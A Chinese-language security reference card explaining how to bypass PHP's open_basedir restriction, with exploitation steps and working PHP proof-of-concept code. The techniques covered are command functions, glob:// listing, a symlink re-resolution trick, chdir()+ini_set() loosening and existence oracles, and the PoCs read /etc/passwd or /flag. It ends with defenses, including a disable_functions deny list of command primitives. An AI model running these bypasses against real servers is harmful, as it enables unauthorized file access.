---
id: web-php-open-basedir-bypass-classic-methods
title: PHP open_basedir 经典绕过：命令函数、glob://、symlink、ini_set 与报错 oracle
type: scenario
domain: web
path: web/php/open-basedir-bypass
technique: php-open-basedir-bypass
aliases:
- open_basedir 绕过
- open_basedir bypass
- PHP open_basedir 逃逸
- glob:// 列目录
- symlink 跨目录读取
- chdir ini_set 放宽 open_basedir
severity: high
confidence: high
status: verified
created: '2026-11-04'
updated: '2026-11-05'
tags:
- php
- open_basedir
- bypass
- webshell
- arbitrary-file-read
- symlink
- glob
- disable-functions
cve: []
verification:
  verified_by: verifier-V10
  verified_at: '2026-11-05T00:50:08+08:00'
  notes: 已对照原文核对命令函数、glob://、symlink 二次解析、chdir+ini_set 窄化与报错 oracle 的原理和 PoC；未验证点：symlink 与 chdir+ini_set 原文未给执行截图，glob:// 在作者 PHP 8 仅能列上一层
---

## 一句话结论

`open_basedir` 只在 PHP 用户态的文件函数层做路径前缀校验，不是进程级隔离；命令执行函数、`glob://` 伪协议、`symlink()` 的二次解析、`chdir()+ini_set()` 的窄化逻辑以及 `SplFileInfo`/`bindtextdomain`/`realpath` 的报错差异，都能让同一路径在“存在性判断”和“前缀校验”之间得出不同结果，从而读取限制目录之外的文件。

## 原理

- `open_basedir` 的实现是在 PHP 文件系统包装器打开路径前调用 `php_check_open_basedir()`，把路径规范化后与允许目录做字符串前缀比较。它限制的是“经过 PHP 文件函数的路径”，不改变进程的文件访问权限，因此以下边界天然存在：
  - **命令执行函数不经过该检查**：`system()`、`exec()`、`shell_exec()`、`passthru()`、`popen()`、`proc_open()` 和反引号把命令交给 shell，由 shell 直接 `open()` 文件，PHP 的文件函数校验根本不会触发。前提是这些函数未被 `disable_functions` 禁用。
  - **`glob://` 在展开阶段返回匹配结果**：`DirectoryIterator('glob:///*')`、`opendir('glob:///*')`、`scandir('glob:///*')` 由 glob 流包装器先展开通配符，再交付匹配到的目录项；校验针对的是展开后的结果而非原始受限路径，因此在部分版本可枚举允许目录之外的项。PHP 7 上 `glob:///*/www/../*` 一类组合可跨层枚举，PHP 8 上实测常只能列到 `glob://..//*` 的上一层。
  - **`symlink()` 的检查与使用不是同一路径**：创建链接时校验的是链接目标字符串解析后的结果，而读取链接时由内核重新解析。构造 `A/B/C/D` 深目录后：
    1. `symlink("A/B/C/D", "SD")` 创建指向深目录的链接；
    2. `symlink("SD/../../../../etc/passwd", "POC")` 校验时把 `SD` 解析为 `A/B/C/D`，`A/B/C/D/../../../../` 恰好回到允许目录，检查通过；
    3. `unlink("SD")` 后在同名位置 `mkdir("SD")`，`SD` 变成真实目录；此时访问 `POC`，内核把 `SD/../../../../etc/passwd` 解析到允许目录之外，读到 `/etc/passwd`。目标多跨几层，就预先建几层目录。
  - **`chdir()+ini_set()` 利用窄化检查的相对路径**：运行时 `ini_set('open_basedir', ...)` 只允许“窄化”，实现方式是 `expand_filepath()` 把新值按当前工作目录展开成绝对路径，再判断是否为原允许路径的子路径。先 `mkdir('sub'); chdir('sub')`，再把 `open_basedir` 设为 `..`——它相对子目录展开为父目录，属于原路径的子路径，检查通过；随后 `chdir('..')` 回到父级，再设 `/`，即可把根目录纳入允许范围。
  - **报错型 oracle 绕过存在性检查**：`bindtextdomain('x', $path)` 在路径存在时原样返回路径、不存在返回 `false`，且不执行 `open_basedir` 校验；`SplFileInfo::getRealPath()` 对存在的路径返回规范化绝对路径、不存在返回 `false`，同样忽略 `open_basedir`；Windows 下 `realpath()` 对越界但存在的文件抛出 `File(...) is not within the allowed path(s)`。三者都把“文件是否存在”编码进返回值或错误信息，可逐字符枚举目录与文件名。
- 共同根因是**检查路径与实际访问路径/时机不一致**（TOCTOU、二次解析、字符串前缀而非真实 inode），而不是某个单一函数漏洞。

## 触发条件

- 已获得任意 PHP 代码执行（webshell、文件包含、模板注入、反序列化等），`open_basedir` 已设置。
- 按手法不同，需要对应能力未禁用：
  - 命令函数：`system`/`exec`/`shell_exec`/`passthru`/`popen`/`proc_open` 至少一个可用；
  - `glob://`：`DirectoryIterator`、`opendir`/`readdir` 或 `scandir` 可用；
  - `symlink`：`symlink`、`mkdir`、`unlink` 可用，且允许目录内可写；
  - `chdir()+ini_set`：`ini_set` 未被禁用，允许目录内可写；
  - 报错 oracle：`bindtextdomain`、`SplFileInfo` 或 Windows 下的 `realpath` 可用。
- 命令函数与 `glob://` 手法不要求可写目录。

## 利用步骤

1. 读取 `ini_get('open_basedir')` 与 `ini_get('disable_functions')`，确认限制目录和可用函数（`phpinfo()` 亦可）。
2. 优先尝试命令执行：`system('cat /flag')`；被禁用则换同义函数、反引号或 `proc_open`，必要时先做 `disable_functions` 绕过。
3. 无法命令执行时按可用函数选择：
   - `glob://` 列目录，确认目标文件名；
   - `symlink` 构造跨目录链接读取单个已知路径；
   - `chdir()+ini_set()` 放宽限制后用 `scandir()` 枚举；
   - 报错 oracle 逐字符枚举未知目录/文件名。
4. 读取配置、密钥、flag 等目标文件，或结合文件包含执行读到的内容。

## PoC

命令函数不受限：

```php
<?php system('cat /flag'); ?>
```

`glob://` 列目录：

```php
<?php
$a = new DirectoryIterator($_GET['c']);   // c=glob:///*
foreach ($a as $f) { echo $f->__toString()."<br>"; }
```

`symlink` 跨目录读取：

```php
<?php
mkdir("A"); chdir("A");
mkdir("B"); chdir("B");
mkdir("C"); chdir("C");
mkdir("D"); chdir("D");
chdir(".."); chdir(".."); chdir(".."); chdir("..");
symlink("A/B/C/D", "SD");
symlink("SD/../../../../etc/passwd", "POC");
unlink("SD");
mkdir("SD");
echo file_get_contents("POC");
```

`chdir()+ini_set()` 放宽限制（需 eval 型入口）：

```php
mkdir('sub');chdir('sub');
ini_set('open_basedir','..');chdir('..');chdir('..');chdir('..');chdir('..');
ini_set('open_basedir','/');
var_dump(scandir('/'));
```

报错 oracle（`SplFileInfo`，枚举 `/etc/passwd` 是否存在）：

```php
<?php
$info = new SplFileInfo($_GET['dir']);
var_dump($info->getRealPath());   // 存在返回绝对路径，不存在 false
```

## 变体与关联

- PHP 8.3 的 curl 扩展 `CURLOPT_PROTOCOLS_STR=all` 绕过见独立卡片；`getcwd()` 失败竞态绕过见独立卡片。
- `symlink` 手法本质是链接目标二次解析，与文件包含/上传中的软链接竞态同源。
- `glob://` 在 PHP 7 与 PHP 8 上的可用深度不同，实战需先探测版本与函数返回值。
- 完整的自动化 EXP 会按目标绝对路径的层数自动创建同名深目录并生成链接，适配任意目标文件。

## 检测与防御

- 不要把 `open_basedir` 当作安全边界；PHP 官方也明确其非安全隔离机制。应在 OS 层做隔离：容器、只读挂载、`open_basedir` 之外的 php-fpm `chroot`、AppArmor/SELinux、独立低权限用户。
- 同时用 `disable_functions` 禁用命令函数与相关原语：`system,exec,shell_exec,passthru,popen,proc_open,symlink,link,ini_set,bindtextdomain,putenv` 等，并注意 `disable_functions` 本身也可被绕过。
- 审计 webshell 行为：短时间内出现 `symlink`/`unlink`/`mkdir` 深目录、`glob://` 路径、`SplFileInfo` 遍历、`ini_set('open_basedir')` 调用均为高可疑信号。
- 监控 Web 进程对允许目录外文件的读取（auditd/eBPF），并对 `/etc/passwd`、密钥、flag 路径设置访问告警。
